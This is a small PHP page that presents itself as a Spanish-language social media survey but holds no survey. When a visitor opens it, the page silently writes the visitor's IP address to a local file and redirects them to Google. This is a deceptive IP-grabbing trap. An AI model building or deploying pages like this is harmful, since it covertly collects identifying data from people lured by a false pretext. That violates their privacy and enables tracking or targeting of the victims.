<html>
<head>
    <title> Encuesta sobre uso de redes sociales </title>
</head>
</html>
<?php
$ip = $_SERVER['HTTP_CLIENT_IP'];
file_put_contents("ip.txt", $ip);
header("location: http://www.google.com.mx");
die();
?>
